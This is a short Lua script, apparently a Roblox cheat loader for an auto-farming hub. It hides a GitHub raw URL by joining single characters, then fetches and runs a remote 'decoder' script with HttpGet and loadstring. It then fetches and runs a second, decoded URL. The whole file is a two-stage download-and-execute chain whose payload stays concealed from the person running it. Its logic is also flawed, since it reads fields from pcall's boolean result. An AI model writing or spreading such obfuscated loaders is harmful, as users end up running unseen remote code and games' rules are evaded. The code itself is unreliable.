-- Break the URL into even smaller parts
local urlPart1 = "h" .. "t" .. "t" .. "p" .. "s"
local urlPart2 = "://" .. "r" .. "a" .. "w" .. "." .. "g" .. "i" .. "t" .. "u" .. "b"
local urlPart3 = ".com/" .. "M" .. "e" .. "l" .. "h" .. "a" .. "r" .. "p" .. "e" .. "r"
local urlPart4 = "/" .. "G" .. "a" .. "b" .. "e" .. "B" .. "o" .. "a" .. "2"
local urlPart5 = "/r" .. "e" .. "f" .. "s" .. "/" .. "h" .. "e" .. "a" .. "d" .. "s"
local urlPart6 = "/m" .. "a" .. "i" .. "n" .. "/" .. "u" .. "r" .. "l" .. "_"
local urlPart7 = "d" .. "e" .. "c" .. "o" .. "d" .. "e" .. "r" .. ".l" .. "u" .. "a"

-- Combine all parts together to form the complete URL
local fullUrl = urlPart1 .. urlPart2 .. urlPart3 .. urlPart4 .. urlPart5 .. urlPart6 .. urlPart7

-- Fetch the URL decoder script
local urlDecoderScript
local success, err = pcall(function()
    urlDecoderScript = game:HttpGet(fullUrl)
end)

if not success or not urlDecoderScript or urlDecoderScript == "" then
    warn("Failed to retrieve URL decoder script: " .. (err or "Unknown error"))
    return
end

-- Print the first 200 characters of the fetched script for debugging
print("Fetched script (first 200 characters):", string.sub(urlDecoderScript, 1, 200))

-- Execute the URL decoder script to get the URL and whitelist function
local urlDecoder, executionErr = pcall(loadstring(urlDecoderScript))

if not urlDecoder then
    warn("Error executing URL decoder script:", executionErr)
    return
end

-- Access the decoded URL and whitelist check function
local decodedUrl = urlDecoder.decodedUrl
local isWhitelisted = urlDecoder.isWhitelisted

if not decodedUrl or decodedUrl == "" then
    warn("Decoded URL is invalid or empty!")
    return
end

-- Check if the decoded URL is valid and not empty
local successLoad, loadErrorMessage = pcall(function()
    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
    loadstring(game:HttpGet(decodedUrl))()
end)

if not successLoad then
    warn("Error loading the script:", loadErrorMessage)
end
